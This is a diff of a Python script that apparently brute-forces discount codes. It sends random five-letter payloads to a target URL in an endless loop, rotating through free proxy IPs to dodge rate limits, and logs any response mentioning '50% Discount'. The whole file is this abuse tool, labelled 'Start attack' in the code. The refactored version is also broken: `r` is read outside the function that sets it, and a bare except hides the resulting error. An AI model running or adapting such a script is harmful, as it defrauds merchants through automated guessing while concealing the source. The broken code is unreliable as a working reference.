@@ -27,14 +27,8 @@ headers["Sec-Fetch-Dest"] = f"{os.environ['Sec-Fetch-Dest']}"
 headers["Sec-Fetch-Mode"] = f"{os.environ['Sec-Fetch-Mode']}"
 headers["Sec-Fetch-Site"] = f"{os.environ['Sec-Fetch-Site']}"
 # print(headers)
-
-# print(data)
-# with open('json.file', "rb") as json_file:
-#     data = json_file.read()
-# print(data)
-# response = requests.get(url, headers = headers, data = data)
-proxy_url = "https://free-proxy-list.net/"
-proxy_ips = find_proxy.get_proxy_ip(proxy_url)
+# Get proxy servers IPs
+proxy_ips = find_proxy.get_proxy_ip()
 # print(proxy_ips)
 def set_payload():
     # Get data from json.file
@@ -45,7 +39,7 @@ def set_payload():
     payload_content = []
     payload = string.ascii_letters
     for i in payload:
-                payload_content.append(i)
+        payload_content.append(i)
     random.shuffle(payload_content)
     payload_content = "".join(payload_content)[:5]
     # print(payload_content)
@@ -56,22 +50,27 @@ def set_payload():
     data = json.dumps(data).encode('utf-8')
     # print(data)
     return data
-while True:
-    data = {}
-    data = set_payload()
-    try:
-        info("Start attack: ")
-        ip = random.choice(proxy_ips)
-        print('Use', ip)
-        r = requests.post(url, headers = headers, data = data, proxies={'http': ip, 'https': ip}, timeout=10)
-        info("Get responses: ")
-        response = r.text
-        print(response)
-        if len(response) < 1000:
-            with open("discount.txt", "a") as target:
-                target.write(response + "\n")
-        if "50% Discount" in response:
-            print("Got Good luck!!")
+def start_to_connect(headers, data, proxy_ips):
+    ip = random.choice(proxy_ips)
+    print('Use', ip)
+    r = requests.post(url, headers=headers, data=data, proxies={'http': ip, 'https': ip}, timeout=10)
+def main():
+    while True:
+        data = {}
+        data = set_payload()
+        try:
+            info("Start attack: ")
+            start_to_connect(headers, data, proxy_ips)
+            info("Get responses: ")
+            response = r.text
             print(response)
-    except:
-        pass
+            # Don't log the message larger than 1000 characters
+            if len(response) < 1000:
+                with open("discount.txt", "a") as target:
+                    target.write(response + "\n")
+            if "50% Discount" in response:
+                print("Got Good luck!!")
+                print(response)
+        except:
+            pass
+main()
